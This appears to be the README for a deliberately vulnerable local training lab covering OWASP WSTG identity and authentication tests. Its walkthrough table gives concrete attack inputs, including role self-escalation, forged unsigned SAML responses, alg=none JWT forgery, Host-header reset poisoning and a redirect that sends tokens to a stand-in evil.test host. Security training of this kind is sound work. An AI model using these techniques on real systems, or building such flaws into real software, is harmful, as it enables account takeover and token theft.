# M02 - Identity Management & Authentication

> **Intentionally vulnerable training target.** Every weakness here is deliberate.
> For authorised security testing and training only. All ports are published on
> `127.0.0.1`; do not expose this stack to any network you do not control.
> Seed data is synthetic (`alice`, `admin`, `Password123!`, ...). No real PII.

Covers **19 WSTG tests**: `WSTG-IDNT-01..05` and `WSTG-ATHN-01..14`.

## Topology

```
   :8200 HTTP ─────────▶┌──────────────────────────────┐
                        │             app              │  Flask 3.0.3 (python:3.12-slim)
                        │  registration / login / MFA  │  sqlite (in-container)
                        │  SAML SP / OIDC RP / WebAuthn│  py_webauthn + lxml
                        └───────────────┬──────────────┘
                                        │ backchannel (edge net)
   :8210 HTTP ─────────▶┌───────────────▼──────────────┐
                        │           keycloak           │  keycloak/keycloak:26.0
                        │  IdP: realm "lab"            │  start-dev --import-realm
                        │  SAML + OIDC clients         │  users alice/bob/fedadmin
                        └──────────────────────────────┘
```

| Port | Service | Purpose |
|---|---|---|
| 8200 | app | portal: identity, authentication, SAML SP, OIDC RP, WebAuthn RP |
| 8210 | keycloak | federation IdP (SAML descriptor + OIDC endpoints), realm `lab` |

`app` sits on `edge` + an `internal: true` `backend` network. Subnets are pinned
to `10.202.0.0/24` / `10.202.1.0/24` because OrbStack's default /24 address pool
is exhausted when all 10 machines run side by side.

## Run

```bash
docker compose up --build -d
docker compose ps                      # both healthy
```

If your Docker injects a host-side proxy from `~/.docker/config.json`, the
compose file already blanks it for builds and runtime. To use a real proxy
instead: `export LAB_HTTP_PROXY=http://your-proxy:port`.

## Run the probes (isolated venv)

From the repo root:

```bash
python3.12 -m venv machines/02-identity-authn/verify/.venv   # 3.12 matches the app; 3.14 lacks cryptography wheels
machines/02-identity-authn/verify/.venv/bin/pip install -r machines/02-identity-authn/verify/requirements.txt
machines/02-identity-authn/verify/.venv/bin/python tools/runner.py machines/02-identity-authn
```

Expect **19/19 PASS**. Probes are idempotent (they create their own accounts and
use unique usernames / rotating `X-Forwarded-For` values per run). Only `athn_13`
needs third-party libs (`cbor2`, `cryptography`) to drive a software WebAuthn
authenticator; everything else is stdlib + `labhttp`.

## Attack walkthrough

### Identity management

| ID | How to exercise it |
|---|---|
| IDNT-01 | `curl :8200/api/roles` → undocumented `superadmin`/`root` with `["*"]`. `POST /register {"username":"x","password":"x","role":"superadmin"}` then login → `GET /admin/panel` returns 200 with `permissions:["*"]`. Role is client-assignable. |
| IDNT-02 | `POST /register {"username":"u","email":"u@mailinator.com"}` → `email_verified:false`, `active:true`, login works immediately (no verification). Fire two concurrent registrations of the same username → both 201, `GET /api/users?username=u` shows 2 rows (no UNIQUE constraint). |
| IDNT-03 | `POST /api/provision/bulk {"count":3,"prefix":"svc"}` with **no auth** → 201, sequential ids, default password `Welcome123!`. `GET /api/users/<id+1>` reads the next account by guessing. |
| IDNT-04 | `POST /login {"username":"admin","password":"wrong"}` → `invalid_password` / "existing user"; unknown user → `no_such_user`. Duplicate `POST /register` → `username_exists:true`. `POST /reset/request` known→200 / unknown→404. Guessable `admin`,`administrator`,`test` all exist. |
| IDNT-05 | `POST /register` with `username` = `""`, `"x"`, `"Ünïcödé😀"`, `"   "` → all 201. No username policy. |

### Authentication

| ID | How to exercise it |
|---|---|
| ATHN-01 | `GET /login` → form `action='http://127.0.0.1:8200/login'` with a password field; `POST /login` over cleartext HTTP succeeds; no HSTS, no TLS redirect. |
| ATHN-02 | `POST /login` with `admin/admin`, `admin/password`, `operator/operator` → all 200 (seeded defaults). |
| ATHN-03 | 5 wrong `POST /login` for `lockme` with `X-Forwarded-For: A` → 6th returns 423. Repeat with `X-Forwarded-For: B` + correct password → 200 (lockout keyed on client header). `POST /login?reset_counter=1` clears the counter. |
| ATHN-04 | `GET /account` → 401. `GET /account?authenticated=true` (or `Cookie: authenticated=true`) → 200 with admin data + `api_key`. No session needed. |
| ATHN-05 | `POST /login remember=1` → `remember_me` cookie = base64(`alice:Password123!`). Decode it; replay it alone in a fresh session → `GET /account` 200. |
| ATHN-06 | Login then `GET /account` → `Cache-Control: public, max-age=3600` (no `no-store`) on a body containing `email` + `api_key`. Back-button / proxy caching leaks it. |
| ATHN-07 | `GET /basic/profile` → 401 `WWW-Authenticate: Basic` over HTTP; with `Authorization: Basic YWRtaW46YWRtaW4=` → 200. `GET /login?username=admin&password=admin` → 200 (creds in URL). |
| ATHN-08 | `GET /recover/questions?username=alice` → questions. `POST /recover/answer {"username":"alice","answer":"smith"}` → reset token. 20 wrong answers first → all 401, no rate limit; default answer is `smith` (also `fluffy`). |
| ATHN-09 | `POST /reset/request {"username":"victim"}` with `Host: evil.test` → `reset_link` points at `evil.test`. Tokens are sequential 4-digit numbers (next = prev+1). `POST /reset/confirm {"token":"<predicted>","new_password":"x"}` resets without the old password; tokens never expire and are reusable. |
| ATHN-10 | Web `POST /login mobileuser/Mobile123!` → `mfa_required:true`, `/account` 403. `POST /mobile/login` with `Authorization: Basic bW9iaWxldXNlcjpNb2JpbGUxMjMh` → 200, `mfa_skipped:true`. 10 wrong mobile attempts → no lockout. |
| ATHN-11 | Login as `mfauser/Mfa123!` (MFA pending) → `GET /mfa/dashboard` directly → 200 with `mfa_passed:false` (post-MFA page skips the check). TOTP seed = base32(username); compute the code → `POST /mfa/verify` 200. Backup code `000001` also works. |
| ATHN-12 | Keycloak IdP: `GET :8210/realms/lab/protocol/saml/descriptor`. Forge an **unsigned** SAML Response (expired `NotOnOrAfter`, wrong `Audience`) with `NameID=admin@corp.lab`, base64 it, `POST /saml/acs SAMLResponse=...` → logged in as admin. `NameID=admin<!---->@corp.lab` (comment injection) also truncates to `admin`. |
| ATHN-13 | `POST /webauthn/register/options` → `userVerification:discouraged`, `attestation:none`, a **static** challenge. Register a software ES256 credential with no UV bit and `fmt:none`. `GET /webauthn/credentials?username=` enumerates cred ids. Complete an assertion in a **fresh session** using the static challenge → authenticated (challenge not session-bound). |
| ATHN-14 | `GET :8210/realms/lab/protocol/openid-connect/token` (password grant, `portal-rp`) → real `id_token`; `GET /oidc/callback?id_token=<real>` → alice. Forge `alg=none` token (`preferred_username:admin`, no nonce, bad state) → callback logs in as admin. `GET /oidc/login?redirect_uri=http://evil.test/steal?x=127.0.0.1:8200` (substring match) then callback → 302 to `evil.test` with `#id_token=...` (token leak). |

## Notes

- The SAML SP, OIDC RP and WebAuthn RP are implemented in `app/app.py` so each
  weakness is real and probeable; Keycloak is the genuine configured IdP.
- `athn_13` drives the full registration/assertion ceremony with a software
  authenticator (`cryptography` + `cbor2`), not a real browser.
- All 19 tests are faithfully realised; none are degraded.